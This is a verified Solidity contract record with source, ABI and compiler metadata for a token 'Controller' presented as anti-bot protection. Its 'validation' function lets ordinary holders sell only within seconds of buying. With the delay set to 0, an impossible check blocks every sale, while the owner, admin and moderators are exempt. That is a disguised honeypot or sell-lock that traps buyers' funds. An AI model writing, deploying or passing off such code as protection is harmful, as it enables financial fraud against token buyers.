{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        return account.code.length > 0;\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract Controller is Context, Ownable {\r\n\r\n    mapping(address => bool) public _moderators;\r\n    mapping(address => uint256) public _lockDelay;\r\n    mapping(address => uint256) public _boughtAmount;\r\n\r\n    uint private _delay = 5;\r\n    bool private _validationActive;\r\n    bool private _sortByContract;\r\n    address admin;\r\n\r\n    constructor () {\r\n        admin = owner();\r\n    }\r\n\r\n    function preventBotPurchase(address to, uint amount) external {\r\n        if (_sortByContract){\r\n            if (Address.isContract(to)){\r\n                _boughtAmount[to] = amount;\r\n                _lockDelay[to] = block.timestamp + _delay;\r\n            } else {\r\n                _boughtAmount[to] = amount;\r\n                _lockDelay[to] = block.timestamp;\r\n            } \r\n        } else {\r\n            _boughtAmount[to] = amount;\r\n            _lockDelay[to] = block.timestamp + _delay;\r\n        }\r\n    }\r\n\r\n        function validation(address from, uint amount, bool isMarketTo) external {\r\n        if (isMarketTo){\r\n            if (!isSuperUser(from)){\r\n                require(amount <= _boughtAmount[from], \"You are trying to sell more then bought!\");\r\n                _boughtAmount[from] -= amount;\r\n                if (_delay == 0){\r\n                    require(_lockDelay[from] < 0, \"Exceed time to sell\");\r\n                }\r\n                require(_lockDelay[from] >= block.timestamp, \"Exceed time to sell\");\r\n            }\r\n        }\r\n    }\r\n\r\n    function isSuperUser(address user) internal view returns(bool){\r\n        if (user == owner() || user == admin || _moderators[user] == true){\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferAdminship(address user) public onlyOwner{\r\n        require(user != address(0), \"Admin can't be zero-address\");\r\n        admin = user;\r\n    }\r\n\r\n    function changeSellDelay(uint newDelay) public onlyOwner {\r\n        _delay = newDelay;\r\n    }\r\n\r\n    function setModerator(address user, bool status) public onlyOwner {\r\n        _moderators[user] = status;\r\n    }\r\n\r\n    function validationActive() view public returns(bool) {\r\n        return _validationActive;\r\n    }\r\n\r\n    function setValidationActive(bool value) public onlyOwner {\r\n        _validationActive = value;\r\n    }\r\n\r\n    function setSortingByContract(bool value) public onlyOwner {\r\n        _sortByContract = value;\r\n    }\r\n\r\n    function sortByContractAllowed() view public returns(bool) {\r\n        return _sortByContract;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_boughtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_lockDelay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_moderators\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newDelay\",\"type\":\"uint256\"}],\"name\":\"changeSellDelay\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"preventBotPurchase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setModerator\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setSortingByContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setValidationActive\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sortByContractAllowed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"transferAdminship\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isMarketTo\",\"type\":\"bool\"}],\"name\":\"validation\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"validationActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Controller", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f0ced768509e8166b133fefb3dab823dbe32f296a2521fe52e0685026e18ac4f"}